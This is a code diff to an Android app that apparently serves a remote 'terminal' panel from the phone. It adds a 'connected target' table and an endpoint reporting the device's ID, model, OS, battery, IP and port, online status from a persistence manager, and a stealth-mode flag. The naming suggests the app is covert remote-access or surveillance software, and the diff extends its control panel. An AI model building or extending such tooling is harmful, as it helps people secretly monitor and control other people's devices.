@@ -10,6 +10,7 @@ import android.util.Log;
 
 import com.labs.labrats.Constants;
 import com.labs.labrats.FirebaseConfig;
+import com.labs.labrats.IO_Persistence_Manager;
 import com.labs.labrats.LabRatsWorker;
 import com.labs.labrats.MainActivity;
 import com.labs.labrats.StatusNotification;
@@ -39,6 +40,8 @@ public class TerminalModule extends BaseModule {
 
         if (uri.equals("/") || uri.equals("/terminal") || uri.isEmpty()) {
             return serveHome(session);
+        } else if (uri.equals("/terminal/targets")) {
+            return serveTargets();
         } else if (uri.equals("/terminal/restart")) {
             return restartServer();
         } else if (uri.equals("/terminal/clear-logs")) {
@@ -91,6 +94,33 @@ public class TerminalModule extends BaseModule {
         html.append("</div>");
         
         html.append("</div>");
+
+        // Connected Target Table inside System Monitor Card
+        html.append("<div style=\"width: 100%; overflow-x: auto; margin-top: 25px; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.25); background: rgba(0, 0, 0, 0.4); padding: 15px; box-sizing: border-box;\">");
+        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;\">");
+        html.append("<div style=\"font-size: 0.75rem; color: var(--neon-cyan); letter-spacing: 2px; font-weight: bold; text-transform: uppercase;\">CONNECTED TARGET <span style=\"color:#888; font-size:0.65rem; font-weight:normal;\">(LIVE AUTO-REFRESH 20s)</span></div>");
+        html.append("<button type=\"button\" onclick=\"refreshTargetsTable()\" class=\"btn btn-small\" style=\"margin:0; padding:6px 12px; font-size:0.65rem; border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0,242,255,0.05);\">REFRESH TARGET</button>");
+        html.append("</div>");
+
+        html.append("<table style=\"width: 100%; border-collapse: separate; border-spacing: 0 4px; font-family: monospace; font-size: 0.75rem; text-align: left;\">");
+        html.append("<thead>");
+        html.append("<tr style=\"color: var(--neon-cyan); text-transform: uppercase; font-size: 0.7rem; border-bottom: 1px solid rgba(0,242,255,0.2);\">");
+        html.append("<th style=\"padding: 8px 10px;\">DEVICE ID</th>");
+        html.append("<th style=\"padding: 8px 10px;\">MODEL</th>");
+        html.append("<th style=\"padding: 8px 10px;\">OS VERSION</th>");
+        html.append("<th style=\"padding: 8px 10px;\">BATTERY</th>");
+        html.append("<th style=\"padding: 8px 10px;\">ENDPOINT IP</th>");
+        html.append("<th style=\"padding: 8px 10px;\">STATUS</th>");
+        html.append("<th style=\"padding: 8px 10px;\">PROFILE</th>");
+        html.append("<th style=\"padding: 8px 10px;\">LAST CHECK-IN</th>");
+        html.append("</tr>");
+        html.append("</thead>");
+        html.append("<tbody id=\"targets-table-body\">");
+        html.append("<tr><td colspan=\"8\" style=\"padding: 15px; text-align: center; color: #888;\">Loading connected targets...</td></tr>");
+        html.append("</tbody>");
+        html.append("</table>");
+        html.append("</div>");
+
         html.append("</div>");
         html.append("</div>"); // Close Status Monitor card
 
@@ -229,6 +259,57 @@ public class TerminalModule extends BaseModule {
         FirebaseConfig.clearSystemLogs();
         FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
         return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+    }
+
+    private Response serveTargets() {
+        try {
+            org.json.JSONObject obj = new org.json.JSONObject();
+
+            String deviceId = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("device_alias", "samsung");
+            if (deviceId.isEmpty()) deviceId = "samsung";
+
+            String model = Build.MODEL != null ? Build.MODEL : "SM-F766W";
+            String osVersion = "Android " + Build.VERSION.RELEASE;
+
+            int batteryLevel = 100;
+            try {
+                android.os.BatteryManager bm = (android.os.BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
+                if (bm != null) {
+                    batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
+                }
+            } catch (Exception ignored) {}
+            String battery = batteryLevel + "%";
+
+            String ip = MainActivity.getLocalIpAddress();
+            String port = String.valueOf(server != null ? server.getListeningPort() : 9191);
+            String endpointIp = (ip != null ? ip : "127.0.0.1") + ":" + port;
+
+            boolean isOnline = IO_Persistence_Manager.getInstance() != null;
+            String status = isOnline ? "ONLINE" : "OFFLINE";
+
+            boolean isStealth = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getBoolean("stealth_mode", false);
+            String profile = isStealth ? "STEALTH" : "NORMAL";
+
+            String lastCheckIn = new java.text.SimpleDateFormat("M/d/yyyy, h:mm:ss a", java.util.Locale.US).format(new java.util.Date());
+
+            org.json.JSONArray list = new org.json.JSONArray();
+            org.json.JSONObject dev = new org.json.JSONObject();
+            dev.put("deviceId", deviceId);
+            dev.put("model", model);
+            dev.put("osVersion", osVersion);
+            dev.put("battery", battery);
+            dev.put("endpointIp", endpointIp);
+            dev.put("status", status);
+            dev.put("profile", profile);
+            dev.put("lastCheckIn", lastCheckIn);
+            list.put(dev);
+
+            obj.put("success", true);
+            obj.put("targets", list);
+            return newResponse(Response.Status.OK, "application/json", obj.toString());
+        } catch (Exception e) {
+            return newResponse(Response.Status.OK, "application/json", "{\"success\": false}");
+        }
     }
 
     private Response serveLogs(Map<String, String> params) {
